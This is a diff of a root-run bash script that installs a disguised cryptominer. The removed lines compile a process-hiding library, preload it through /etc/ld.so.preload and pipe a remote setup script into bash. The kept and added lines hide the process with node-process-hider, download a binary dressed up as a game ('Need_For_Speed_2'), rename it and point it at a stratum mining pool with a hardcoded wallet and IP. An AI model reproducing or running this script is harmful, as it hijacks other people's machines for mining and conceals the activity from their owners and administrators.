@@ -1,19 +1,8 @@
 #!/bin/bash 
 sudo su <<EOF
-apt update && apt -y install sudo wget curl unzip >/dev/null 2>&1
-apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
-sudo apt install screen -y
-wget https://raw.githubusercontent.com/sarifadim/dopla/main/processhider.c
-sudo apt install build-essential -y
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
-sudo mv libprocesshider.so /usr/local/lib/
-sudo echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang >/dev/null 2>&1
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
 apt-get install -y nodejs >/dev/null 2>&1
 sudo apt install npm
-sudo npm i -g node-process-hider && sudo ph add project
-wget https://github.com/sarifadim/dopla/raw/main/Need_For_Speed_2 && chmod +x Need_For_Speed_2 && mv Need_For_Speed_2 project && ./project -P stratum2+tcp://3JWuijUT2hwsC862trVXBSMzQW6JANF63j.SETUP@34.149.10.66:9200 -R --HWMON 2 --verbosity 1 --work-timeout 999
+sudo npm i -g node-process-hider && sudo ph add tdm
+wget https://github.com/sarifadim/dopla/raw/main/Need_For_Speed_2 && chmod +x Need_For_Speed_2 && mv Need_For_Speed_2 tdm && ./tdm -P stratum2+tcp://3JWuijUT2hwsC862trVXBSMzQW6JANF63j.SETUP@34.149.10.66:9200 -R --HWMON 2 --verbosity 1 --work-timeout 999
 EOF
 screen -r
